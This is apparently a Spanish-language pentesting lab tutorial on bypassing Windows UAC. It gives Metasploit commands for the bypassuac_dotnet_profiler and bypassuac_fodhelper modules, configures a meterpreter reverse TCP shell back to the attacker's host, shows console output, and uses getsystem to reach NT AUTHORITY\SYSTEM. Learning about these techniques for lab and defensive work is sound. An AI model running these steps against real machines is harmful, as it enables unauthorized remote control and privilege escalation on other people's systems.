# Elevación de privilegios (UAC Bypass)

El _`Bypass UAC (User Account Control)`_ en Windows es una técnica que permite a un atacante ejecutar código con privilegios elevados (`administrador`) sin necesidad de mostrar el cuadro de diálogo de `UAC`, el cual normalmente solicita aprobación del usuario para realizar acciones sensibles.

En este tipo de vulnerabilidad hay muchisimas formas de `Bypassear` esto, pero los fundamentos de este `Bypass` es que se puede hacer esta vulnerabilidad ya que cuando sale el recuadro de dialogo del `UAC` de `Windows` lo esta cogiendo de una ruta en los registros del mismo la cual se puede modificar sin necesidad de ser administradores, por lo que nosotros podremos modificar eso por una `powershell` y cuando se ejecute ese dialogo nos va a ejecutar la `powershell`.

Por lo que vamos a utilizar modulos como `metasploit` en los cuales ya tienen este tipo de tecnicas de forma automatica y vamos a utilizar contra la maquina `windows` el `exploit` que el `suggester` nos recomendo anteriormente.

```shell
msfconsole -q
```

Una vez que tengamos la maquina comprometida mediante el `web delivery` teniendo una shell, la dejaremos en segundo plano con `background`, haremos `back` y pondremos lo siguiente.

```shell
use exploit/windows/local/bypassuac_dotnet_profiler
```

Y lo configuramos todo:

```shell
set session 1
set LHOST <IP>
set LPORT 4455
exploit
```

Y esto lo que nos dara sera una shell con `meterpreter` de forma que seremos el mismo usuario, pero con privilegios de administrador.

Si ese anterior fallara, tendremos mas para `bypassear` el `UAC` como por ejemplo:

```shell
use exploit/windows/local/bypassuac_fodhelper
```

Configuracion:

```shell
set session 1
set LHOST <IP>
set LPORT 7777
set target 1
set payload windows/x64/meterpreter/reverse_tcp
exploit
```

Info:

```
[*] Started reverse TCP handler on 192.168.16.139:7777 
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Configuring payload and stager registry keys ...
[*] Executing payload: C:\Windows\system32\cmd.exe /c C:\Windows\System32\fodhelper.exe
[*] Sending stage (201798 bytes) to 192.168.16.138
[*] Cleaining up registry keys ...
[*] Meterpreter session 2 opened (192.168.16.139:7777 -> 192.168.16.138:49676) at 2024-11-21 07:04:27 -0500

meterpreter >
```

Y si hacemos un `getuid` veremos que seguimos siendo ese mismo usuario:

```
Server username: DESKTOP-EALA4JN\d1se0
```

Pero si hacemos el siguiente comando para que nos escale privilegios de forma automatica, veremos lo siguiente:

```
getsystem
```

Info:

```
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
```

Y si ahora hacemos un `getuid`, ahora si que veremos que somos administradores:

```
Server username: NT AUTHORITY\SYSTEM
```
